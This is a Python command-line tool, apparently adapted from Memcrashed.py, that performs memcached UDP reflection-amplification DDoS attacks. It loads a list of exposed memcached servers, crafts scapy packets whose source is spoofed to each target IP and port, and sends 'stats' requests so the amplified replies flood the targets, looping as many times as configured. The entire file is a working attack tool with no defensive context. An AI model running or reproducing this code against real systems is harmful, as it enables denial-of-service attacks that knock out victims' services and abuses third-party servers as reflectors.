#!/usr/bin/env python3

# Based on Memcrashed.py
# Changes made:
# * pass configuration as options/flags rather than through interactive session
# * multiple target IP:PORT pairs
# * shodan API is not used, the list of servers should be available in bots.txt
# * smart scheduling for sending UDP packets

import click
from scapy.all import *
from typing import List


MEMCACHED_PORT = 11211
STATS_PAYLOAD = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"


def read_bots(filepath:str="./bots.txt") -> List[str]:
    with open(filepath, "r") as fd:
        return [ip.strip() for ip in  fd.readlines() if ip.strip() != ""]


def prepare_packet(
    dest_ip: str, dest_port: int,
    target_ip: str, target_port: int,
    payload: str = STATS_PAYLOAD
):
    return IP(src=target_ip, dst=dest_ip) / UDP(sport=target_port, dport=dest_port) / Raw(load=payload)


class IpPortPair(click.ParamType):
    name = "IP:PORT"

    def convert(self, value, param, ctx):
        parts = value.split(":")
        if len(parts) == 1:
            ip, port = parts[0], 80
        elif len(parts) == 2:
            ip, port = parts[0], int(parts[1])
        else:
            self.fail(f"{value!r} should be valid <IP:PORT> pair", param, ctx)
        return (ip, port)


# xxx(okachaiev): implement custom payload
# xxx(okachaiev): better progress tracker
@click.command()
@click.option("--targets", "-t", type=IpPortPair(), help="<ip:port> pair", multiple=True)
@click.option("--num-packets", default=1, help="Number of packets to send to each Memcached server (per loop)")
@click.option("--bots-config", default="./bots.txt", help="Path to file with the list of Memcached servers")
@click.option("--repeat", default=1, help="How many times to loop over list of bot servers")
def crash(targets, num_packets, bots_config, repeat):
    if not targets:
        print(f"ERROR: at least a single target should be specified")
        exit(1)

    bots = read_bots(bots_config)
    if not bots:
        print(f"ERROR: {bot_config} file is missing or empty")
        exit(1)
    print(f"Loaded {len(bots)} Memcached IPs")

    for loop in range(1,repeat+1):
        for ip, port in targets:
            for bot in bots:
                print(f"[+] loop={loop}\ttarget={ip}:{port}\tdest={bot}\tpackets={num_packets}")
                packet = prepare_packet(dest_ip=bot, dest_port=MEMCACHED_PORT, target_ip=ip, target_port=port)
                send(packet, count=num_packets, verbose=False)


if __name__ == "__main__":
    crash()
